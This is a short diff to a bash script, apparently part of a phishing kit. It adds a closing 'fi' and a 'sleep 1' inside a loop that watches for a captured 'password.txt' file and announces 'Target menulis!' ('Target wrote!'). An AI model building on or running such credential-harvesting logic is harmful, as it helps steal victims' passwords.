@@ -38,6 +38,8 @@ if [[ -e "server/$server/password.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Target menulis!\n"
 password
 
+fi
+sleep 1
 done 
 
 }
